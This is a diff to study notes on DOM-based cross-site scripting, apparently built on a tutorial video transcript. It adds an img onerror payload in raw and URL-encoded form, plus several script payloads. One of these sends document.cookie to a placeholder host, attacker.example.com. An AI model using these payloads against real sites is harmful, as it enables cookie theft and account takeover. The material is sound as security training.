@@ -1,4 +1,4 @@
-
+DOM based xss
 
 
 
@@ -142,6 +142,8 @@ Can you script whatever one you want to use?
 My favorite go to is just an image source X on error equals alert, and that should give us an XSS.
 `/test123?nahamsecparam=test456<img src=x onerror=alert()> 
 also this is the encoded version 
+`/test123?nahamsecparam=test456%3Cimg%20src%3Dx%20onerror%3Dalert()%3E`
+
 
 37
 00:01:52,500 --> 00:01:56,400
@@ -163,6 +165,53 @@ So if there's an error, this follows an exists Pop-Up Alert, which is a function
 00:02:11,300 --> 00:02:15,750
 We can also do other stuff like document, location, document, cookie and so on.
 
+---
+JavaScript payload examples that incorporate additional DOM objects (such as document, location, and document.cookie) to demonstrate potential impacts. These payloads are intended for educational testing in controlled environments only:
+
+1. **Exfiltrate Cookies via an Alert:**
+    
+    ```html
+    <script>alert(document.cookie);</script>
+    ```
+    
+    _This payload retrieves the document’s cookies and displays them in an alert box._
+    
+2. **Redirect the Browser to an External URL with Cookies:**
+    
+    ```html
+    <script>location.href='https://attacker.example.com/steal?cookie=' + encodeURIComponent(document.cookie);</script>
+    ```
+    
+    _This payload sends the document's cookies as a URL parameter to an external domain and redirects the browser there._
+    
+3. **Log Document Content:**
+    
+    ```html
+    <script>console.log(document.documentElement.innerHTML);</script>
+    ```
+    
+    _This payload logs the full HTML content of the page to the browser's console (for testing purposes)._
+    
+4. **Dynamic Content Injection:**
+    
+    ```html
+    <script>
+      document.body.innerHTML += "<div style='background:red;color:white;'>Injected Content: " + document.cookie + "</div>";
+    </script>
+    ```
+    
+    _This payload appends a new div element to the page's body that displays some text along with the document's cookies._
+    
+
+Remember:
+
+- These payloads are for demonstration and testing only.
+    
+- Use them only in controlled environments and with proper authorization.
+    
+- Always ensure you have permission before testing or exploiting vulnerabilities.
+
+---
 42
 00:02:15,750 --> 00:02:16,860
 We'll cover these later on.
